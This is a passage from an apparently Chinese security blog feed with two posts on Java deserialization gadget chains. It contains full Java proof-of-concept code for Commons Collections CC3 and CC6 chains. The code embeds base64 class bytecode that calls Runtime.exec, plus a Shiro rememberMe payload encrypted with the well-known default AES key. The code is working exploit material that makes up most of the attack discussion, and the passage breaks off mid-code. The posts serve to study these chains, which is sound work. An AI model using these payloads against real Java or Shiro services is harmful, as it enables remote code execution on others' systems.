+<br>                <span class="hljs-string">&quot;AQADKClWAQAEdGhpcwEAEkxvcmcvbGNkbTEyMy9FeGVjOwEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3Vt&quot;</span> +<br>                <span class="hljs-string">&quot;ZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +<br>                <span class="hljs-string">&quot;YWxpemF0aW9uSGFuZGxlcjsHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot;</span> +<br>                <span class="hljs-string">&quot;bC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJ&quot;</span> +<br>                <span class="hljs-string">&quot;dGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlcmlh&quot;</span> +<br>                <span class="hljs-string">&quot;bGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJj&quot;</span> +<br>                <span class="hljs-string">&quot;ZUZpbGUBAAlFeGVjLmphdmEBABBvcmcvbGNkbTEyMy9FeGVjDAARABIHACwMAC0ALgEAEGdub21l&quot;</span> +<br>                <span class="hljs-string">&quot;LWNhbGN1bGF0b3IMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0&quot;</span> +<br>                <span class="hljs-string">&quot;Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2&quot;</span> +<br>                <span class="hljs-string">&quot;YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhl&quot;</span> +<br>                <span class="hljs-string">&quot;YwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;AAgACQACAAoAAAA3AAIAAQAAAAm7AAFZtwACV7EAAAACAAsAAAAKAAIAAAANAAgADgAMAAAADAAB&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAQAACAAEAAAAOKrcAA7gABBIFtgAGV7EA&quot;</span> +<br>                <span class="hljs-string">&quot;AAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4AEwAUAAAADwAAAAQAAQAQAAEAFQAW&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAWAAwAAAAgAAMAAAABABMAFAAAAAAAAQAX&quot;</span> +<br>                <span class="hljs-string">&quot;ABgAAQAAAAEAGQAaAAIADwAAAAQAAQAbAAEAFQAcAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAG&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAAAAbAAwAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHQAeAAIAAAABAB8AIAADAA8A&quot;</span> +<br>                <span class="hljs-string">&quot;AAAEAAEAGwABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>));<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.clear();<br><br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        ByteSource payload = aes.encrypt(bytes, key);<br>        System.out.println(payload.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001116904.png" alt="image-20211116001116904"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001047051.png" alt="image-20211116001047051"></p><p>对于 POC 还是需要去理解这几个方法的原理</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>P神的方法链中使用了 javassist 直接加载class文件，就不用再中途获取一遍 base64 编码。这个链子主要就是结合了一下 CC6 和 CC3，然后修改了调用方法不使用数组的方法了</p><p>P神留下的几个注意点：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116001835882.png" alt="image-20211116001835882"></p><p>参考文章</p><p>P神代码审计</p><p><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p><p><a href="http://wjlshare.com/archives/1542">http://wjlshare.com/archives/1542</a></p><p><a href="https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://0range228.github.io/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.sec-in.com/article/999">https://www.sec-in.com/article/999</a></p><p><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p><p><a href="http://wh1sper.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/">http://wh1sper.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java CC3</title>
    <link href="/2021/11/16/Java-CC3/"/>
    <url>/2021/11/16/Java-CC3/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-CC3"><a href="#Java-CC3" class="headerlink" title="Java CC3"></a>Java CC3</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>看了P神的代码审计，大致看了一遍，发现 CC3 可以粗略的理解为 CC1 加上 <code>TemplatesTmpl</code>加载字节码，所以赶紧回去复习一下。</p><p><a href="http://lcdm123.xyz/2021/11/07/Java-CC/">http://lcdm123.xyz/2021/11/07/Java-CC/</a></p><p><a href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</a></p><p>字节码对应的类必须是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>这里直接将CC1 与 <code>TemplatesTmpl</code>中的代码简单结合一下，运行测试</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111001023097.png" alt="image-20211111001023097"></p><p>但是在 CC3 的链中并没有使用到<code>InvokeTransformer</code>，这是因为在反序列化爆出来之后，一些Java 反序列化过滤器将它拦截了，例如：<a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a></p><h2 id="升级demo"><a href="#升级demo" class="headerlink" title="升级demo"></a>升级demo</h2><p>CommonsCollections3 的目的就是为了绕过一些规则对<code>InvokerTransformer</code>的限制，这里选择利用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111002740283.png" alt="image-20211111002740283"></p><p>这个类的构造方法中使用了<code>(TransformerImpl)templates.newTransformer()</code> 这样我们就可避免使用<code>InvokerTransformer</code>来手工调用<code>newTransformer()</code></p><p>那么现在的问题就是如何调用<code>TrAXFilter</code>的构造方法，能直接new对象吗？？ 这里选择的方法就是<code> org.apache.commons.collections.functors.InstantiateTransformer</code>，它也实现了一个<code>Transformer</code>接口通过反射来调用构造方法。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111003627512.png" alt="image-20211111003627512"></p><p>绕过了<code>InvokerTransformer</code>加载字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111004610107.png" alt="image-20211111004610107"></p><blockquote><p>一个注意的小点就是这里使用的 <code>Templates.class</code> 刚好对应了<code>TrAXFilter</code>的构造方法</p></blockquote><h3 id="Ysoserial中的写法"><a href="#Ysoserial中的写法" class="headerlink" title="Ysoserial中的写法"></a>Ysoserial中的写法</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111005612455.png" alt="image-20211111005612455"></p><p>这个里面还是使用的 CC1中的<code>LazyMap</code>，并且利用代理机制调用了<code>invoke</code></p><p>这里直接模仿 Ysoserial 的方法写一个简易的POC</p><h3 id="根据CC1写POC"><a href="#根据CC1写POC" class="headerlink" title="根据CC1写POC"></a>根据CC1写POC</h3><p>测试的时候发现一个问题，在Java7中使用<code>TemplatesImpl</code>类加载字节码的时候会报错，但是在Java8中测试正常</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111220813349.png" alt="image-20211111220813349"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111220917179.png" alt="image-20211111220917179"></p><p>这里就导致了我利用<code>TransformerMap</code>构造链子的时候爆出了错误，对比一下两个版本类的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformerMapCC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException </span>&#123;<br>        BASE64Decoder decoder = <span class="hljs-keyword">new</span> BASE64Decoder();<br>        <span class="hljs-keyword">byte</span>[] bytes = decoder.decodeBuffer(<span class="hljs-string">&quot;yv66vgAAADQAMAoABgAiCgAjACQIACUKACMAJgcAJwcAKAEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTG9yZy9sY2Rt&quot;</span> +<br>                <span class="hljs-string">&quot;MTIzL1BheWxvYWQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy&quot;</span> +<br>                <span class="hljs-string">&quot;bmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYo&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRl&quot;</span> +<br>                <span class="hljs-string">&quot;cmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJh&quot;</span> +<br>                <span class="hljs-string">&quot;dG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp&quot;</span> +<br>                <span class="hljs-string">&quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYHACoBAApTb3VyY2VG&quot;</span> +<br>                <span class="hljs-string">&quot;aWxlAQAMUGF5bG9hZC5qYXZhDAAdAB4HACsMACwALQEAEGdub21lLWNhbGN1bGF0b3IMAC4ALwEA&quot;</span> +<br>                <span class="hljs-string">&quot;E29yZy9sY2RtMTIzL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&quot;</span> +<br>                <span class="hljs-string">&quot;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&quot;</span> +<br>                <span class="hljs-string">&quot;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&quot;</span> +<br>                <span class="hljs-string">&quot;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAQAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAAN&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAAYAAQAAABQACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FwAYAAMAEgAAAAQAAQATAAkAGQAaAAEACQAAACsAAAABAAAAAbEAAAACAAoAAAAGAAEAAAAYAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAMAAEAAAABABsAHAAAAAEAHQAeAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAK&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAHwABACAAAAACACE=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldName(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldName(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldName(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        inerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;lcdm&quot;</span>);<br>        Map outerMap = TransformedMap.decorate(inerMap, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outerMap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldName</span><span class="hljs-params">(Object obj, String Fieldname, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(Fieldname);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>应该是java版本的问题这里的代码并没有执行成功，但是我感觉代码没有错误，这里是java 版本的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211112233412106.png" alt="image-20211112233412106"></p><h3 id="CC6结合后的POC"><a href="#CC6结合后的POC" class="headerlink" title="CC6结合后的POC"></a>CC6结合后的POC</h3><p>相比于 CC1 改造的链子，这个比较通用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6ToCC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMAoABgAiCgAjACQIACUKACMAJgcAJwcAKAEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTG9yZy9sY2Rt&quot;</span> +<br>                <span 